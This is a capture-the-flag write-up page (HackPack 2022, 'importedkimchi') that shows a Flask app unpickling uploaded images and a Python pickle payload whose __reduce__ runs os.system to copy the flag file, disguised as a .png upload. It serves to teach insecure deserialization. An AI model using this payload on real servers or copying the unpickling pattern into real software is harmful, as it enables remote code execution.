@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self' https://*; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; media-src 'self'; object-src 'self'; child-src 'self'; form-action 'none'; base-uri 'self'" />
+<meta http-equiv="X-XSS-Protection"  content="1;mode=block" always>
+<meta http-equiv="Referrer-Policy" content="no-referrer, strict-origin-when-cross-origin"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>/writeups/ctf/hackpack-2022/importedkimchi</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="/writeups/ctf/hackpack-2022/importedkimchi" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/writeups/ctf/hackpack-2022/importedkimchi" />
+<meta property="og:url" content="http://0.0.0.0:4000/writeups/ctf/hackpack-2022/importedkimchi" />
+<meta property="og:site_name" content="gloof’s hideout" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="/writeups/ctf/hackpack-2022/importedkimchi" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"/writeups/ctf/hackpack-2022/importedkimchi","url":"http://0.0.0.0:4000/writeups/ctf/hackpack-2022/importedkimchi"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/home</a></li><li><a href="/writeups">/writeups</a></li><li><a href="/projects">/projects</a></li><li><a href="/music">/music</a></li></ul>
+  </div>
+</header>
+<main>
+      <p>They give the source code of the webapp in challenge so lets take a look at it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import uuid
+from flask import *
+from flask_bootstrap import Bootstrap
+import pickle
+import os
+
+app = Flask(__name__)
+Bootstrap(app)
+
+app.secret_key = 'sup3r s3cr3t k3y'
+
+ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])
+
+images = set()
+images.add('bibimbap.jpg')
+images.add('galbi.jpg')
+images.add('pickled_kimchi.jpg')
+
+@app.route('/')
+def index():
+    return render_template("index.html", images=images)
+
+@app.route('/upload', methods=['GET', 'POST'])
+def upload():
+    if request.method == 'POST':
+        image = request.files["image"]
+        if image and image.filename.split(".")[-1].lower() in ALLOWED_EXTENSIONS:
+            # special file names are fun!
+            extension = "." + image.filename.split(".")[-1].lower()
+            fancy_name = str(uuid.uuid4()) + extension
+
+            image.save(os.path.join('./images', fancy_name))
+            flash("Successfully uploaded image! View it at /images/" + fancy_name, "success")
+            return redirect(url_for('upload'))
+
+        else:
+            flash("An error occured while uploading the image! Support filetypes are: png, jpg, jpeg", "danger")
+            return redirect(url_for('upload'))
+
+    else:
+        return render_template("upload.html")
+
+@app.route('/images/&lt;filename&gt;')
+def display_image(filename):
+    try:
+        pickle.loads(open('./images/' + filename, 'rb').read())
+    except:
+        pass
+    return send_from_directory('./images', filename)
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0')
+</code></pre></div></div>
+<p>So, the website allows you to upload an image, and then it stores it in the “images/” directory with a random name.</p>
+
+<p>You’re only allowed to post .png, .jpg, and .jpeg files.
+It determines the file type by the file name, and not by the contents of the file.
+This means that so long as it ends in the above extensions it will allow the upload.</p>
+
+<p>Let’s also take a look at the “display_image” function.
+When you try to go to an image in the images/ directory, it will try to unpickle the file, and regardless of whether the “pickle.loads” returns anything, will redirect you to the image.</p>
+
+<p>What is pickling?</p>
+
+<p>If you’re familiar with PHP, pickling is the same as serialize/unserialize. More info can be found in the <a href="https://docs.python.org/3/library/pickle.html">docs</a></p>
+
+<p>However, unpickling user input is very dangerous, as when something is unpickled, it is executed immediately.</p>
+
+<p>The game plan for attack is to write serialized data to a file, upload it, then access the file, causing our code to be executed on the server.</p>
+
+<p>For this I created a script to cat the flag.txt into an arbitrary file in the images directory. With special help from <a href="https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_python.html">SecureFlag</a> :)</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ("cat flag.txt &gt; images/flaggerino")
+        return os.system, (cmd,)
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    with open('exploit.png', 'wb') as file:
+        file.write(pickled)
+</code></pre></div></div>
+
+<p>If we upload the png, then go to /images/flaggerino, we’ll get the flag!</p>
+
+<p>Moral of the story, DON’T UNSERIALIZE UNSANITIZED USER INPUT!!!!</p>
+
+
+    </main><footer>
+  follow me on <a href="https://twitter.com/gloof11">twitter</a>
+  <br/>
+  <a href="https://github.com/gloof11">github</a>
+</footer>
+</div>
+  </body>
+</html>
